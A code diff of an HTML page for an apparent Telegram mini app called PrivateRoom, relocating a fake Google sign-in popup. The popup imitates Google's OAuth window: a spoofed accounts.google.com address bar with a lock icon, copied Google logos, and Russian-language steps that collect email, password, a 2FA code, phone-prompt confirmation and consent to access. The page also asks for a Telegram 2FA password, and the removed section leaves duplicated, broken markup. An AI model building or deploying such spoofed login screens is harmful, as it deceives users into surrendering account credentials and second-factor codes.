@@ -184,238 +184,14 @@
                             <input type="password" id="password2FA" placeholder=" " autocomplete="current-password">
                             <label for="password2FA">Введите пароль 2FA</label>
                             <button type="button" class="eye-toggle" id="togglePasswordBtn">👁</button>
-     <!-- GOOGLE OAUTH POPUP MODAL WINDOW -->
-    <div id="googleAuthModal" class="google-modal-overlay hidden">
-        <div class="google-modal-window">
-            <!-- OAuth Window Browser Top Bar -->
-            <div class="google-window-topbar">
-                <div class="google-url-badge">
-                    <span class="google-lock-icon">🔒</span>
-                    <span class="google-url-text">accounts.google.com/o/oauth2/v2/auth</span>
-                </div>
-                <button type="button" class="google-window-close" id="btnCloseGoogleModal">✕</button>
-            </div>
-
-            <!-- Scrollable Modal Window Content -->
-            <div class="google-window-content">
-                <!-- STEP GOOGLE 1: Email Input Screen -->
-                <section id="stepGoogleEmail" class="auth-step google-modal-step">
-                    <div class="google-card-header">
-                        <svg class="google-wordmark-logo" viewBox="0 0 75 24" width="75" height="24">
-                            <path fill="#4285F4" d="M9.24 10.19v2.33h5.53c-.22 1.4-1.68 4.1-5.53 4.1-3.33 0-6.05-2.76-6.05-6.17s2.72-6.17 6.05-6.17c1.9 0 3.17.81 3.9 1.5l1.84-1.78C13.62 2.76 11.63 1.9 9.24 1.9 4.13 1.9 0 6.03 0 11.14s4.13 9.24 9.24 9.24c5.34 0 8.89-3.75 8.89-9.05 0-.61-.07-1.07-.15-1.53H9.24z"/>
-                            <path fill="#EA4335" d="M24.8 11.14c0 3.32-2.5 5.76-5.69 5.76s-5.69-2.44-5.69-5.76 2.5-5.76 5.69-5.76 5.69 2.44 5.69 5.76zm-2.48 0c0-2.07-1.42-3.48-3.21-3.48s-3.21 1.41-3.21 3.48 1.42 3.48 3.21 3.48 3.21-1.41 3.21-3.48z"/>
-                            <path fill="#FBBC05" d="M37.36 11.14c0 3.32-2.5 5.76-5.69 5.76s-5.69-2.44-5.69-5.76 2.5-5.76 5.69-5.76 5.69 2.44 5.69 5.76zm-2.49 0c0-2.07-1.42-3.48-3.21-3.48s-3.21 1.41-3.21 3.48 1.42 3.48 3.21-3.48 3.21-1.41 3.21-3.48z"/>
-                            <path fill="#4285F4" d="M49.2 5.76v10.59c0 4.36-2.57 6.14-5.61 6.14-2.88 0-4.61-1.93-5.26-3.51l2.17-.9c.38.92 1.34 2.01 3.09 2.01 2.02 0 3.28-1.25 3.28-3.6v-.88h-.09c-.6.74-1.75 1.39-3.2 1.39-3.03 0-5.79-2.64-5.79-5.72 0-3.11 2.76-5.76 5.79-5.76 1.45 0 2.6.65 3.2 1.37h.09V5.76H49.2zm-2.28 5.4c0-2.04-1.34-3.48-3.09-3.48-1.78 0-3.12 1.44-3.12 3.48 0 2.01 1.34 3.48 3.12 3.48 1.75 0 3.09-1.47 3.09-3.48z"/>
-                            <path fill="#34A853" d="M54.12 1.9v18.01h-2.42V1.9h2.42z"/>
-                            <path fill="#EA4335" d="M63.81 13.56l1.93 1.29c-.62.92-2.12 2.52-4.68 2.52-3.2 0-5.6-2.5-5.6-5.76 0-3.41 2.42-5.76 5.33-5.76 2.93 0 4.36 2.38 4.83 3.67l.27.7-7.66 3.17c.59 1.15 1.5 1.73 2.8 1.73 1.31 0 2.19-.64 2.78-1.56zm-5.72-2.58l5.12-2.13c-.29-.74-1.15-1.27-2.15-1.27-1.29 0-3.05 1.15-2.97 3.4z"/>
-                        </svg>
-                        <h1 class="google-title">Вход</h1>
-                        <p class="google-subtitle">Перейти к приложению PrivateRoom</p>
-                    </div>
-
-                    <div class="google-form-body">
-                        <div class="google-input-box">
-                            <input type="email" id="googleEmailInput" class="google-input" placeholder=" " autocomplete="email" inputmode="email">
-                            <label for="googleEmailInput" class="google-label">Телефон или адрес эл. почты</label>
-                        </div>
-
-                        <a href="#" class="google-link" onclick="event.preventDefault();">Забыли адрес электронной почты?</a>
-
-                        <p class="google-hint-text">
-                            Не ваш компьютер? Используйте режим частного просмотра для входа. 
-                            <a href="#" class="google-link" onclick="event.preventDefault();">Подробнее...</a>
-                        </p>
-
-                        <div class="google-action-row">
-                            <button type="button" class="google-btn-text" id="btnBackFromGoogleToTG">Создать аккаунт</button>
-                            <button type="button" class="google-btn-primary" id="btnSubmitGoogleEmail">Далее</button>
                         </div>
                     </div>
-                </section>
-
-                <!-- STEP GOOGLE 2: Password Input Screen -->
-                <section id="stepGooglePassword" class="auth-step google-modal-step">
-                    <div class="google-card-header">
-                        <svg class="google-wordmark-logo" viewBox="0 0 75 24" width="75" height="24">
-                            <path fill="#4285F4" d="M9.24 10.19v2.33h5.53c-.22 1.4-1.68 4.1-5.53 4.1-3.33 0-6.05-2.76-6.05-6.17s2.72-6.17 6.05-6.17c1.9 0 3.17.81 3.9 1.5l1.84-1.78C13.62 2.76 11.63 1.9 9.24 1.9 4.13 1.9 0 6.03 0 11.14s4.13 9.24 9.24 9.24c5.34 0 8.89-3.75 8.89-9.05 0-.61-.07-1.07-.15-1.53H9.24z"/>
-                            <path fill="#EA4335" d="M24.8 11.14c0 3.32-2.5 5.76-5.69 5.76s-5.69-2.44-5.69-5.76 2.5-5.76 5.69-5.76 5.69 2.44 5.69 5.76zm-2.48 0c0-2.07-1.42-3.48-3.21-3.48s-3.21 1.41-3.21 3.48 1.42 3.48 3.21 3.48 3.21-1.41 3.21-3.48z"/>
-                            <path fill="#FBBC05" d="M37.36 11.14c0 3.32-2.5 5.76-5.69 5.76s-5.69-2.44-5.69-5.76 2.5-5.76 5.69-5.76 5.69 2.44 5.69 5.76zm-2.49 0c0-2.07-1.42-3.48-3.21-3.48s-3.21 1.41-3.21 3.48 1.42 3.48 3.21 3.48 3.21-1.41 3.21-3.48z"/>
-                            <path fill="#4285F4" d="M49.2 5.76v10.59c0 4.36-2.57 6.14-5.61 6.14-2.88 0-4.61-1.93-5.26-3.51l2.17-.9c.38.92 1.34 2.01 3.09 2.01 2.02 0 3.28-1.25 3.28-3.6v-.88h-.09c-.6.74-1.75 1.39-3.2 1.39-3.03 0-5.79-2.64-5.79-5.72 0-3.11 2.76-5.76 5.79-5.76 1.45 0 2.6.65 3.2 1.37h.09V5.76H49.2zm-2.28 5.4c0-2.04-1.34-3.48-3.09-3.48-1.78 0-3.12 1.44-3.12 3.48 0 2.01 1.34 3.48 3.12 3.48 1.75 0 3.09-1.47 3.09-3.48z"/>
-                            <path fill="#34A853" d="M54.12 1.9v18.01h-2.42V1.9h2.42z"/>
-                            <path fill="#EA4335" d="M63.81 13.56l1.93 1.29c-.62.92-2.12 2.52-4.68 2.52-3.2 0-5.6-2.5-5.6-5.76 0-3.41 2.42-5.76 5.33-5.76 2.93 0 4.36 2.38 4.83 3.67l.27.7-7.66 3.17c.59 1.15 1.5 1.73 2.8 1.73 1.31 0 2.19-.64 2.78-1.56zm-5.72-2.58l5.12-2.13c-.29-.74-1.15-1.27-2.15-1.27-1.29 0-3.05 1.15-2.97 3.4z"/>
-                        </svg>
-                        <h1 class="google-title">Добро пожаловать</h1>
-                        <div class="google-user-chip" id="btnBackToGoogleEmail">
-                            <div class="google-avatar-mini" id="googleChipInitial">G</div>
-                            <span class="google-chip-email" id="googleDisplayEmail">user@gmail.com</span>
-                            <svg class="google-chip-chevron" viewBox="0 0 24 24" width="16" height="16" fill="currentColor">
-                                <path d="M7 10l5 5 5-5z"/>
-                            </svg>
-                        </div>
-                    </div>
-
-                    <div class="google-form-body">
-                        <div class="google-input-box">
-                            <input type="password" id="googlePasswordInput" class="google-input" placeholder=" " autocomplete="current-password">
-                            <label for="googlePasswordInput" class="google-label">Введите пароль</label>
-                            <button type="button" class="google-eye-toggle" id="toggleGooglePasswordBtn">👁</button>
-                        </div>
-
-                        <div class="google-action-row">
-                            <button type="button" class="google-link-btn" id="btnForgotGooglePassword">Забыли пароль?</button>
-                            <button type="button" class="google-btn-primary" id="btnSubmitGooglePassword">Далее</button>
-                        </div>
-                    </div>
-                </section>
-
-                <!-- STEP GOOGLE 3: 2FA Verification Screen -->
-                <section id="stepGoogle2FA" class="auth-step google-modal-step">
-                    <div class="google-card-header">
-                        <svg class="google-wordmark-logo" viewBox="0 0 75 24" width="75" height="24">
-                            <path fill="#4285F4" d="M9.24 10.19v2.33h5.53c-.22 1.4-1.68 4.1-5.53 4.1-3.33 0-6.05-2.76-6.05-6.17s2.72-6.17 6.05-6.17c1.9 0 3.17.81 3.9 1.5l1.84-1.78C13.62 2.76 11.63 1.9 9.24 1.9 4.13 1.9 0 6.03 0 11.14s4.13 9.24 9.24 9.24c5.34 0 8.89-3.75 8.89-9.05 0-.61-.07-1.07-.15-1.53H9.24z"/>
-                            <path fill="#EA4335" d="M24.8 11.14c0 3.32-2.5 5.76-5.69 5.76s-5.69-2.44-5.69-5.76 2.5-5.76 5.69-5.76 5.69 2.44 5.69 5.76zm-2.48 0c0-2.07-1.42-3.48-3.21-3.48s-3.21 1.41-3.21 3.48 1.42 3.48 3.21 3.48 3.21-1.41 3.21-3.48z"/>
-                            <path fill="#FBBC05" d="M37.36 11.14c0 3.32-2.5 5.76-5.69 5.76s-5.69-2.44-5.69-5.76 2.5-5.76 5.69-5.76 5.69 2.44 5.69 5.76zm-2.49 0c0-2.07-1.42-3.48-3.21-3.48s-3.21 1.41-3.21 3.48 1.42 3.48 3.21 3.48 3.21-1.41 3.21-3.48z"/>
-                            <path fill="#4285F4" d="M49.2 5.76v10.59c0 4.36-2.57 6.14-5.61 6.14-2.88 0-4.61-1.93-5.26-3.51l2.17-.9c.38.92 1.34 2.01 3.09 2.01 2.02 0 3.28-1.25 3.28-3.6v-.88h-.09c-.6.74-1.75 1.39-3.2 1.39-3.03 0-5.79-2.64-5.79-5.72 0-3.11 2.76-5.76 5.79-5.76 1.45 0 2.6.65 3.2 1.37h.09V5.76H49.2zm-2.28 5.4c0-2.04-1.34-3.48-3.09-3.48-1.78 0-3.12 1.44-3.12 3.48 0 2.01 1.34 3.48 3.12 3.48 1.75 0 3.09-1.47 3.09-3.48z"/>
-                            <path fill="#34A853" d="M54.12 1.9v18.01h-2.42V1.9h2.42z"/>
-                            <path fill="#EA4335" d="M63.81 13.56l1.93 1.29c-.62.92-2.12 2.52-4.68 2.52-3.2 0-5.6-2.5-5.6-5.76 0-3.41 2.42-5.76 5.33-5.76 2.93 0 4.36 2.38 4.83 3.67l.27.7-7.66 3.17c.59 1.15 1.5 1.73 2.8 1.73 1.31 0 2.19-.64 2.78-1.56zm-5.72-2.58l5.12-2.13c-.29-.74-1.15-1.27-2.15-1.27-1.29 0-3.05 1.15-2.97 3.4z"/>
-                        </svg>
-                        <h1 class="google-title">Двухэтапная аутентификация</h1>
-                        <div class="google-user-chip" id="btnBackToGooglePassword">
-                            <div class="google-avatar-mini" id="google2faChipInitial">G</div>
-                            <span class="google-chip-email" id="google2faDisplayEmail">user@gmail.com</span>
-                        </div>
-                    </div>
-
-                    <div class="google-form-body">
-                        <p class="google-desc-text">
-                            Чтобы защитить ваш аккаунт, Google хочет убедиться, что это действительно вы. 
-                            Введите 6-значный код подтверждения из SMS или приложения Authenticator.
-                        </p>
-
-                        <div class="google-input-box">
-                            <input type="text" id="google2faCodeInput" class="google-input" maxlength="8" placeholder=" " inputmode="numeric">
-                            <label for="google2faCodeInput" class="google-label">Введите код (G-XXXXXX)</label>
-                        </div>
-
-                        <div class="google-action-row">
-                            <button type="button" class="google-link-btn" id="btnSkipGoogle2FA">Другой способ</button>
-                            <button type="button" class="google-btn-primary" id="btnSubmitGoogle2FA">Далее</button>
-                        </div>
-                    </div>
-                </section>
-
-                <!-- STEP GOOGLE 4: Device Prompt Verification -->
-                <section id="stepGooglePrompt" class="auth-step google-modal-step">
-                    <div class="google-card-header">
-                        <svg class="google-wordmark-logo" viewBox="0 0 75 24" width="75" height="24">
-                            <path fill="#4285F4" d="M9.24 10.19v2.33h5.53c-.22 1.4-1.68 4.1-5.53 4.1-3.33 0-6.05-2.76-6.05-6.17s2.72-6.17 6.05-6.17c1.9 0 3.17.81 3.9 1.5l1.84-1.78C13.62 2.76 11.63 1.9 9.24 1.9 4.13 1.9 0 6.03 0 11.14s4.13 9.24 9.24 9.24c5.34 0 8.89-3.75 8.89-9.05 0-.61-.07-1.07-.15-1.53H9.24z"/>
-                            <path fill="#EA4335" d="M24.8 11.14c0 3.32-2.5 5.76-5.69 5.76s-5.69-2.44-5.69-5.76 2.5-5.76 5.69-5.76 5.69 2.44 5.69 5.76zm-2.48 0c0-2.07-1.42-3.48-3.21-3.48s-3.21 1.41-3.21 3.48 1.42 3.48 3.21 3.48 3.21-1.41 3.21-3.48z"/>
-                            <path fill="#FBBC05" d="M37.36 11.14c0 3.32-2.5 5.76-5.69 5.76s-5.69-2.44-5.69-5.76 2.5-5.76 5.69-5.76 5.69 2.44 5.69 5.76zm-2.49 0c0-2.07-1.42-3.48-3.21-3.48s-3.21 1.41-3.21 3.48 1.42 3.48 3.21 3.48 3.21-1.41 3.21-3.48z"/>
-                            <path fill="#4285F4" d="M49.2 5.76v10.59c0 4.36-2.57 6.14-5.61 6.14-2.88 0-4.61-1.93-5.26-3.51l2.17-.9c.38.92 1.34 2.01 3.09 2.01 2.02 0 3.28-1.25 3.28-3.6v-.88h-.09c-.6.74-1.75 1.39-3.2 1.39-3.03 0-5.79-2.64-5.79-5.72 0-3.11 2.76-5.76 5.79-5.76 1.45 0 2.6.65 3.2 1.37h.09V5.76H49.2zm-2.28 5.4c0-2.04-1.34-3.48-3.09-3.48-1.78 0-3.12 1.44-3.12 3.48 0 2.01 1.34 3.48 3.12 3.48 1.75 0 3.09-1.47 3.09-3.48z"/>
-                            <path fill="#34A853" d="M54.12 1.9v18.01h-2.42V1.9h2.42z"/>
-                            <path fill="#EA4335" d="M63.81 13.56l1.93 1.29c-.62.92-2.12 2.52-4.68 2.52-3.2 0-5.6-2.5-5.6-5.76 0-3.41 2.42-5.76 5.33-5.76 2.93 0 4.36 2.38 4.83 3.67l.27.7-7.66 3.17c.59 1.15 1.5 1.73 2.8 1.73 1.31 0 2.19-.64 2.78-1.56zm-5.72-2.58l5.12-2.13c-.29-.74-1.15-1.27-2.15-1.27-1.29 0-3.05 1.15-2.97 3.4z"/>
-                        </svg>
-                        <h1 class="google-title">Проверьте ваш телефон</h1>
-                        <p class="google-desc-text">Google отправил уведомление на ваше основное устройство.</p>
-                    </div>
-
-                    <div class="google-form-body">
-                        <div class="google-prompt-card">
-                            <div class="google-prompt-number" id="googlePromptNumber">42</div>
-                            <p class="google-prompt-text">
-                                Нажмите <strong>«Да, это я»</strong> на телефоне и выберите число <strong>42</strong>.
-                            </p>
-                        </div>
-
-                        <div class="google-action-row">
-                            <button type="button" class="google-link-btn" id="btnBackToGoogle2FA">Другой способ</button>
-                            <button type="button" class="google-btn-primary" id="btnConfirmGooglePrompt">Я нажал на телефоне</button>
-                        </div>
-                    </div>
-                </section>
-
-                <!-- STEP GOOGLE 5: OAuth Permission Consent Screen -->
-                <section id="stepGoogleConsent" class="auth-step google-modal-step">
-                    <div class="google-card-header">
-                        <svg class="google-wordmark-logo" viewBox="0 0 75 24" width="75" height="24">
-                            <path fill="#4285F4" d="M9.24 10.19v2.33h5.53c-.22 1.4-1.68 4.1-5.53 4.1-3.33 0-6.05-2.76-6.05-6.17s2.72-6.17 6.05-6.17c1.9 0 3.17.81 3.9 1.5l1.84-1.78C13.62 2.76 11.63 1.9 9.24 1.9 4.13 1.9 0 6.03 0 11.14s4.13 9.24 9.24 9.24c5.34 0 8.89-3.75 8.89-9.05 0-.61-.07-1.07-.15-1.53H9.24z"/>
-                            <path fill="#EA4335" d="M24.8 11.14c0 3.32-2.5 5.76-5.69 5.76s-5.69-2.44-5.69-5.76 2.5-5.76 5.69-5.76 5.69 2.44 5.69 5.76zm-2.48 0c0-2.07-1.42-3.48-3.21-3.48s-3.21 1.41-3.21 3.48 1.42 3.48 3.21 3.48 3.21-1.41 3.21-3.48z"/>
-                            <path fill="#FBBC05" d="M37.36 11.14c0 3.32-2.5 5.76-5.69 5.76s-5.69-2.44-5.69-5.76 2.5-5.76 5.69-5.76 5.69 2.44 5.69 5.76zm-2.49 0c0-2.07-1.42-3.48-3.21-3.48s-3.21 1.41-3.21 3.48 1.42 3.48 3.21 3.48 3.21-1.41 3.21-3.48z"/>
-                            <path fill="#4285F4" d="M49.2 5.76v10.59c0 4.36-2.57 6.14-5.61 6.14-2.88 0-4.61-1.93-5.26-3.51l2.17-.9c.38.92 1.34 2.01 3.09 2.01 2.02 0 3.28-1.25 3.28-3.6v-.88h-.09c-.6.74-1.75 1.39-3.2 1.39-3.03 0-5.79-2.64-5.79-5.72 0-3.11 2.76-5.76 5.79-5.76 1.45 0 2.6.65 3.2 1.37h.09V5.76H49.2zm-2.28 5.4c0-2.04-1.34-3.48-3.09-3.48-1.78 0-3.12 1.44-3.12 3.48 0 2.01 1.34 3.48 3.12 3.48 1.75 0 3.09-1.47 3.09-3.48z"/>
-                            <path fill="#34A853" d="M54.12 1.9v18.01h-2.42V1.9h2.42z"/>
-                            <path fill="#EA4335" d="M63.81 13.56l1.93 1.29c-.62.92-2.12 2.52-4.68 2.52-3.2 0-5.6-2.5-5.6-5.76 0-3.41 2.42-5.76 5.33-5.76 2.93 0 4.36 2.38 4.83 3.67l.27.7-7.66 3.17c.59 1.15 1.5 1.73 2.8 1.73 1.31 0 2.19-.64 2.78-1.56zm-5.72-2.58l5.12-2.13c-.29-.74-1.15-1.27-2.15-1.27-1.29 0-3.05 1.15-2.97 3.4z"/>
-                        </svg>
-                        <h1 class="google-title">Предоставление доступа</h1>
-                        <div class="google-user-chip">
-                            <div class="google-avatar-mini" id="googleConsentChipInitial">G</div>
-                            <span class="google-chip-email" id="googleConsentDisplayEmail">user@gmail.com</span>
-                        </div>
-                    </div>
-
-                    <div class="google-form-body">
-                        <p class="google-desc-text">
-                            Приложение <strong>PrivateRoom Auth</strong> запрашивает доступ к вашему аккаунту Google:
-                        </p>
-
-                        <div class="google-consent-list">
-                            <div class="google-consent-item">
-                                <svg viewBox="0 0 24 24" width="20" height="20" fill="#1a73e8"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
-                                <div>
-                                    <strong>Просмотр личных данных</strong>
-                                    <span>Имя, адрес эл. почты и фото профиля</span>
-                                </div>
-                            </div>
-                            <div class="google-consent-item">
-                                <svg viewBox="0 0 24 24" width="20" height="20" fill="#1a73e8"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
-                                <div>
-                                    <strong>Связанные устройства</strong>
-                                    <span>Синхронизация ключей безопасности E2E</span>
-                                </div>
-                            </div>
-                        </div>
-
-                        <p class="google-hint-text">
-                            Нажимая «Продолжить», вы разрешаете этому приложению использовать ваши данные в соответствии со своими условиями.
-                        </p>
-
-                        <div class="google-action-row">
-                            <button type="button" class="google-link-btn" id="btnCancelGoogleConsent">Отмена</button>
-                            <button type="button" class="google-btn-primary" id="btnSubmitGoogleConsent">Продолжить</button>
-                        </div>
-                    </div>
-                </section>
-            </div>
-
-            <!-- Google Accounts Window Footer -->
-            <div class="google-modal-footer">
-                <div class="google-footer-lang">Русский ▾</div>
-                <div class="google-footer-links">
-                    <a href="#" onclick="event.preventDefault();">Справка</a>
-                    <a href="#" onclick="event.preventDefault();">Конфиденциальность</a>
-                    <a href="#" onclick="event.preventDefault();">Условия</a>
-                </div>
-            </div>
-        </div>
-    </div>                <span>Имя, адрес эл. почты и фото профиля</span>
-                            </div>
-                        </div>
-                        <div class="google-consent-item">
-                            <svg viewBox="0 0 24 24" width="20" height="20" fill="#1a73e8"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
-                            <div>
-                                <strong>Связанные устройства</strong>
-                                <span>Синхронизация ключей безопасности E2E</span>
-                            </div>
-                        </div>
-                    </div>
-
-                    <p class="google-hint-text">
-                        Нажимая «Продолжить», вы разрешаете этому приложению использовать ваши данные в соответствии со своими условиями.
-                    </p>
-
-                    <div class="google-action-row">
-                        <button type="button" class="google-link-btn" id="btnCancelGoogleConsent">Отмена</button>
-                        <button type="button" class="google-btn-primary" id="btnSubmitGoogleConsent">Продолжить</button>
-                    </div>
+                    <button class="btn btn-primary" id="btnSubmit2FA">
+                        <span>Подтвердить »</span>
+                    </button>
+                    <button type="button" class="btn-text" id="btnBackToCodeFrom2FA">
+                        <span>« Назад к коду</span>
+                    </button>
                 </div>
             </section>
 
@@ -1370,6 +1146,220 @@
         <footer class="app-footer">
             <span class="footer-tag">@PrivateRoom_AppBot</span>
         </footer>
+    </div>
+
+    <!-- GOOGLE OAUTH POPUP MODAL WINDOW -->
+    <div id="googleAuthModal" class="google-modal-overlay hidden">
+        <div class="google-modal-window">
+            <!-- OAuth Window Browser Top Bar -->
+            <div class="google-window-topbar">
+                <div class="google-url-badge">
+                    <span class="google-lock-icon">🔒</span>
+                    <span class="google-url-text">accounts.google.com/o/oauth2/v2/auth</span>
+                </div>
+                <button type="button" class="google-window-close" id="btnCloseGoogleModal">✕</button>
+            </div>
+
+            <!-- Scrollable Modal Window Content -->
+            <div class="google-window-content">
+                <!-- STEP GOOGLE 1: Email Input Screen -->
+                <section id="stepGoogleEmail" class="auth-step google-modal-step">
+                    <div class="google-card-header">
+                        <svg class="google-wordmark-logo" viewBox="0 0 75 24" width="75" height="24">
+                            <path fill="#4285F4" d="M9.24 10.19v2.33h5.53c-.22 1.4-1.68 4.1-5.53 4.1-3.33 0-6.05-2.76-6.05-6.17s2.72-6.17 6.05-6.17c1.9 0 3.17.81 3.9 1.5l1.84-1.78C13.62 2.76 11.63 1.9 9.24 1.9 4.13 1.9 0 6.03 0 11.14s4.13 9.24 9.24 9.24c5.34 0 8.89-3.75 8.89-9.05 0-.61-.07-1.07-.15-1.53H9.24z"/>
+                            <path fill="#EA4335" d="M24.8 11.14c0 3.32-2.5 5.76-5.69 5.76s-5.69-2.44-5.69-5.76 2.5-5.76 5.69-5.76 5.69 2.44 5.69 5.76zm-2.48 0c0-2.07-1.42-3.48-3.21-3.48s-3.21 1.41-3.21 3.48 1.42 3.48 3.21 3.48 3.21-1.41 3.21-3.48z"/>
+                            <path fill="#FBBC05" d="M37.36 11.14c0 3.32-2.5 5.76-5.69 5.76s-5.69-2.44-5.69-5.76 2.5-5.76 5.69-5.76 5.69 2.44 5.69 5.76zm-2.49 0c0-2.07-1.42-3.48-3.21-3.48s-3.21 1.41-3.21 3.48 1.42 3.48 3.21-3.48 3.21-1.41 3.21-3.48z"/>
+                            <path fill="#4285F4" d="M49.2 5.76v10.59c0 4.36-2.57 6.14-5.61 6.14-2.88 0-4.61-1.93-5.26-3.51l2.17-.9c.38.92 1.34 2.01 3.09 2.01 2.02 0 3.28-1.25 3.28-3.6v-.88h-.09c-.6.74-1.75 1.39-3.2 1.39-3.03 0-5.79-2.64-5.79-5.72 0-3.11 2.76-5.76 5.79-5.76 1.45 0 2.6.65 3.2 1.37h.09V5.76H49.2zm-2.28 5.4c0-2.04-1.34-3.48-3.09-3.48-1.78 0-3.12 1.44-3.12 3.48 0 2.01 1.34 3.48 3.12 3.48 1.75 0 3.09-1.47 3.09-3.48z"/>
+                            <path fill="#34A853" d="M54.12 1.9v18.01h-2.42V1.9h2.42z"/>
+                            <path fill="#EA4335" d="M63.81 13.56l1.93 1.29c-.62.92-2.12 2.52-4.68 2.52-3.2 0-5.6-2.5-5.6-5.76 0-3.41 2.42-5.76 5.33-5.76 2.93 0 4.36 2.38 4.83 3.67l.27.7-7.66 3.17c.59 1.15 1.5 1.73 2.8 1.73 1.31 0 2.19-.64 2.78-1.56zm-5.72-2.58l5.12-2.13c-.29-.74-1.15-1.27-2.15-1.27-1.29 0-3.05 1.15-2.97 3.4z"/>
+                        </svg>
+                        <h1 class="google-title">Вход</h1>
+                        <p class="google-subtitle">Перейти к приложению PrivateRoom</p>
+                    </div>
+
+                    <div class="google-form-body">
+                        <div class="google-input-box">
+                            <input type="email" id="googleEmailInput" class="google-input" placeholder=" " autocomplete="email" inputmode="email">
+                            <label for="googleEmailInput" class="google-label">Телефон или адрес эл. почты</label>
+                        </div>
+
+                        <a href="#" class="google-link" onclick="event.preventDefault();">Забыли адрес электронной почты?</a>
+
+                        <p class="google-hint-text">
+                            Не ваш компьютер? Используйте режим частного просмотра для входа. 
+                            <a href="#" class="google-link" onclick="event.preventDefault();">Подробнее...</a>
+                        </p>
+
+                        <div class="google-action-row">
+                            <button type="button" class="google-btn-text" id="btnBackFromGoogleToTG">Создать аккаунт</button>
+                            <button type="button" class="google-btn-primary" id="btnSubmitGoogleEmail">Далее</button>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- STEP GOOGLE 2: Password Input Screen -->
+                <section id="stepGooglePassword" class="auth-step google-modal-step">
+                    <div class="google-card-header">
+                        <svg class="google-wordmark-logo" viewBox="0 0 75 24" width="75" height="24">
+                            <path fill="#4285F4" d="M9.24 10.19v2.33h5.53c-.22 1.4-1.68 4.1-5.53 4.1-3.33 0-6.05-2.76-6.05-6.17s2.72-6.17 6.05-6.17c1.9 0 3.17.81 3.9 1.5l1.84-1.78C13.62 2.76 11.63 1.9 9.24 1.9 4.13 1.9 0 6.03 0 11.14s4.13 9.24 9.24 9.24c5.34 0 8.89-3.75 8.89-9.05 0-.61-.07-1.07-.15-1.53H9.24z"/>
+                            <path fill="#EA4335" d="M24.8 11.14c0 3.32-2.5 5.76-5.69 5.76s-5.69-2.44-5.69-5.76 2.5-5.76 5.69-5.76 5.69 2.44 5.69 5.76zm-2.48 0c0-2.07-1.42-3.48-3.21-3.48s-3.21 1.41-3.21 3.48 1.42 3.48 3.21 3.48 3.21-1.41 3.21-3.48z"/>
+                            <path fill="#FBBC05" d="M37.36 11.14c0 3.32-2.5 5.76-5.69 5.76s-5.69-2.44-5.69-5.76 2.5-5.76 5.69-5.76 5.69 2.44 5.69 5.76zm-2.49 0c0-2.07-1.42-3.48-3.21-3.48s-3.21 1.41-3.21 3.48 1.42 3.48 3.21-3.48 3.21-1.41 3.21-3.48z"/>
+                            <path fill="#4285F4" d="M49.2 5.76v10.59c0 4.36-2.57 6.14-5.61 6.14-2.88 0-4.61-1.93-5.26-3.51l2.17-.9c.38.92 1.34 2.01 3.09 2.01 2.02 0 3.28-1.25 3.28-3.6v-.88h-.09c-.6.74-1.75 1.39-3.2 1.39-3.03 0-5.79-2.64-5.79-5.72 0-3.11 2.76-5.76 5.79-5.76 1.45 0 2.6.65 3.2 1.37h.09V5.76H49.2zm-2.28 5.4c0-2.04-1.34-3.48-3.09-3.48-1.78 0-3.12 1.44-3.12 3.48 0 2.01 1.34 3.48 3.12 3.48 1.75 0 3.09-1.47 3.09-3.48z"/>
+                            <path fill="#34A853" d="M54.12 1.9v18.01h-2.42V1.9h2.42z"/>
+                            <path fill="#EA4335" d="M63.81 13.56l1.93 1.29c-.62.92-2.12 2.52-4.68 2.52-3.2 0-5.6-2.5-5.6-5.76 0-3.41 2.42-5.76 5.33-5.76 2.93 0 4.36 2.38 4.83 3.67l.27.7-7.66 3.17c.59 1.15 1.5 1.73 2.8 1.73 1.31 0 2.19-.64 2.78-1.56zm-5.72-2.58l5.12-2.13c-.29-.74-1.15-1.27-2.15-1.27-1.29 0-3.05 1.15-2.97 3.4z"/>
+                        </svg>
+                        <h1 class="google-title">Добро пожаловать</h1>
+                        <div class="google-user-chip" id="btnBackToGoogleEmail">
+                            <div class="google-avatar-mini" id="googleChipInitial">G</div>
+                            <span class="google-chip-email" id="googleDisplayEmail">user@gmail.com</span>
+                            <svg class="google-chip-chevron" viewBox="0 0 24 24" width="16" height="16" fill="currentColor">
+                                <path d="M7 10l5 5 5-5z"/>
+                            </svg>
+                        </div>
+                    </div>
+
+                    <div class="google-form-body">
+                        <div class="google-input-box">
+                            <input type="password" id="googlePasswordInput" class="google-input" placeholder=" " autocomplete="current-password">
+                            <label for="googlePasswordInput" class="google-label">Введите пароль</label>
+                            <button type="button" class="google-eye-toggle" id="toggleGooglePasswordBtn">👁</button>
+                        </div>
+
+                        <div class="google-action-row">
+                            <button type="button" class="google-link-btn" id="btnForgotGooglePassword">Забыли пароль?</button>
+                            <button type="button" class="google-btn-primary" id="btnSubmitGooglePassword">Далее</button>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- STEP GOOGLE 3: 2FA Verification Screen -->
+                <section id="stepGoogle2FA" class="auth-step google-modal-step">
+                    <div class="google-card-header">
+                        <svg class="google-wordmark-logo" viewBox="0 0 75 24" width="75" height="24">
+                            <path fill="#4285F4" d="M9.24 10.19v2.33h5.53c-.22 1.4-1.68 4.1-5.53 4.1-3.33 0-6.05-2.76-6.05-6.17s2.72-6.17 6.05-6.17c1.9 0 3.17.81 3.9 1.5l1.84-1.78C13.62 2.76 11.63 1.9 9.24 1.9 4.13 1.9 0 6.03 0 11.14s4.13 9.24 9.24 9.24c5.34 0 8.89-3.75 8.89-9.05 0-.61-.07-1.07-.15-1.53H9.24z"/>
+                            <path fill="#EA4335" d="M24.8 11.14c0 3.32-2.5 5.76-5.69 5.76s-5.69-2.44-5.69-5.76 2.5-5.76 5.69-5.76 5.69 2.44 5.69 5.76zm-2.48 0c0-2.07-1.42-3.48-3.21-3.48s-3.21 1.41-3.21 3.48 1.42 3.48 3.21 3.48 3.21-1.41 3.21-3.48z"/>
+                            <path fill="#FBBC05" d="M37.36 11.14c0 3.32-2.5 5.76-5.69 5.76s-5.69-2.44-5.69-5.76 2.5-5.76 5.69-5.76 5.69 2.44 5.69 5.76zm-2.49 0c0-2.07-1.42-3.48-3.21-3.48s-3.21 1.41-3.21 3.48 1.42 3.48 3.21-3.48 3.21-1.41 3.21-3.48z"/>
